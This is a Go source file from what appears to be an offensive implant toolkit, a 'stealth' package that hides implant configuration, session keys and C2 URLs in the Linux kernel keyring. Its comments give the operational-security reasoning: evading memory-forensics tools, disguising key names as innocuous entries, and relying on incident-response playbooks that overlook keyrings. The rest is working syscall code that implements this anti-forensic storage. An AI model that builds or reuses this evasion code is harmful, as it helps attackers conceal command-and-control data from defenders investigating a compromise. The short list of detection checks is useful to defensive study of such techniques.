package stealth

// Kernel Keyring Config Storage — Invisible Data Storage
//
// OPSEC rationale: The Linux kernel keyring (keyctl) provides a key-value
// store inside kernel memory. Data stored here:
//   - Does NOT appear in /proc/[pid]/maps or memory dumps
//   - Is NOT visible via /proc/[pid]/mem reads
//   - Cannot be found by scanning process address space
//   - Survives across exec() (session keyring persists)
//   - Is only accessible via keyctl() syscalls
//
// We use this to store implant configuration, session keys, and C2 URLs.
// Memory forensic tools (Volatility, LiME, AVML) that dump userspace
// memory will NOT find our secrets — they live in kernel memory.
//
// Capability: None (user keyring is unprivileged)
// Kernel: 2.6+ (keyctl has been available for a very long time)
//
// Detection:
//   - `keyctl show @s` would list keys in the session keyring
//   - /proc/keys (if enabled) shows all keys on the system
//   - Almost no forensic tool or IR playbook checks kernel keyrings

import (
	"fmt"
	"syscall"
	"unsafe"
)

// keyctl command constants.
const (
	sysKeyctl     = 250 // __NR_keyctl (x86_64)
	sysAddKey     = 248 // __NR_add_key
	sysRequestKey = 249 // __NR_request_key

	keyctlRead       = 11 // KEYCTL_READ
	keyctlRevoke     = 3  // KEYCTL_REVOKE
	keyctlSetTimeout = 6  // KEYCTL_SET_TIMEOUT

	// Special keyring IDs
	keySpecSessionKeyring = -3 // KEY_SPEC_SESSION_KEYRING
	keySpecUserKeyring    = -4 // KEY_SPEC_USER_KEYRING
)

// KeyringStore provides kernel keyring-based storage for implant data.
type KeyringStore struct {
	keyring int32            // which keyring to use
	keys    map[string]int32 // description → key serial
}

// NewKeyringStore creates a store backed by the session keyring.
func NewKeyringStore() *KeyringStore {
	return &KeyringStore{
		keyring: keySpecSessionKeyring,
		keys:    make(map[string]int32),
	}
}

// NewUserKeyringStore creates a store backed by the user keyring.
// The user keyring persists across sessions (until the user's last process exits).
func NewUserKeyringStore() *KeyringStore {
	return &KeyringStore{
		keyring: keySpecUserKeyring,
		keys:    make(map[string]int32),
	}
}

// Store adds or updates a key in the kernel keyring.
// The description should look innocuous (e.g., "dns:resolver.conf" or "user:session-token").
// Data is stored in kernel memory, invisible to userspace memory forensics.
func (ks *KeyringStore) Store(description string, data []byte) error {
	if len(data) == 0 {
		return fmt.Errorf("cannot store empty data")
	}
	keyType := []byte("user\x00")
	desc := []byte(description + "\x00")

	serial, _, errno := syscall.Syscall6(
		sysAddKey,
		uintptr(unsafe.Pointer(&keyType[0])),
		uintptr(unsafe.Pointer(&desc[0])),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(ks.keyring),
		0,
	)
	if errno != 0 {
		return fmt.Errorf("add_key %s: %v", description, errno)
	}

	ks.keys[description] = int32(serial)
	return nil
}

// Retrieve reads a key's payload from the kernel keyring.
func (ks *KeyringStore) Retrieve(description string) ([]byte, error) {
	serial, ok := ks.keys[description]
	if !ok {
		// Try to find the key by requesting it
		var err error
		serial, err = ks.requestKey(description)
		if err != nil {
			return nil, err
		}
	}

	// First call with nil buffer to get the size
	size, _, errno := syscall.Syscall6(
		sysKeyctl,
		keyctlRead,
		uintptr(serial),
		0,
		0,
		0, 0,
	)
	if errno != 0 {
		return nil, fmt.Errorf("keyctl read size %s: %v", description, errno)
	}

	// Allocate buffer and read
	buf := make([]byte, size)
	n, _, errno := syscall.Syscall6(
		sysKeyctl,
		keyctlRead,
		uintptr(serial),
		uintptr(unsafe.Pointer(&buf[0])),
		size,
		0, 0,
	)
	if errno != 0 {
		return nil, fmt.Errorf("keyctl read %s: %v", description, errno)
	}

	return buf[:n], nil
}

// Delete revokes a key from the keyring, securely destroying its contents.
func (ks *KeyringStore) Delete(description string) error {
	serial, ok := ks.keys[description]
	if !ok {
		return nil // key doesn't exist
	}

	_, _, errno := syscall.Syscall6(
		sysKeyctl,
		keyctlRevoke,
		uintptr(serial),
		0, 0, 0, 0,
	)
	if errno != 0 {
		return fmt.Errorf("keyctl revoke %s: %v", description, errno)
	}

	delete(ks.keys, description)
	return nil
}

// SetExpiry sets a timeout on a key. After the timeout, the kernel
// automatically revokes and destroys the key. Useful for session keys
// that should not persist indefinitely.
func (ks *KeyringStore) SetExpiry(description string, seconds uint) error {
	serial, ok := ks.keys[description]
	if !ok {
		return fmt.Errorf("key not found: %s", description)
	}

	_, _, errno := syscall.Syscall6(
		sysKeyctl,
		keyctlSetTimeout,
		uintptr(serial),
		uintptr(seconds),
		0, 0, 0,
	)
	if errno != 0 {
		return fmt.Errorf("keyctl set_timeout %s: %v", description, errno)
	}

	return nil
}

// DeleteAll revokes all keys managed by this store.
func (ks *KeyringStore) DeleteAll() {
	for desc := range ks.keys {
		ks.Delete(desc)
	}
}

// requestKey finds a key by description using request_key().
func (ks *KeyringStore) requestKey(description string) (int32, error) {
	keyType := []byte("user\x00")
	desc := []byte(description + "\x00")

	serial, _, errno := syscall.Syscall6(
		sysRequestKey,
		uintptr(unsafe.Pointer(&keyType[0])),
		uintptr(unsafe.Pointer(&desc[0])),
		0, // callout_info (not needed for existing keys)
		uintptr(ks.keyring),
		0, 0,
	)
	if errno != 0 {
		return 0, fmt.Errorf("request_key %s: %v", description, errno)
	}

	ks.keys[description] = int32(serial)
	return int32(serial), nil
}

// KeyringAvailable checks if keyctl is functional.
func KeyringAvailable() bool {
	// Try reading the session keyring — should succeed for any process
	id := int32(keySpecSessionKeyring) // runtime conversion for negative constant
	_, _, errno := syscall.Syscall6(
		sysKeyctl,
		0, // KEYCTL_GET_KEYRING_ID
		uintptr(id),
		0, // don't create
		0, 0, 0,
	)
	return errno == 0
}
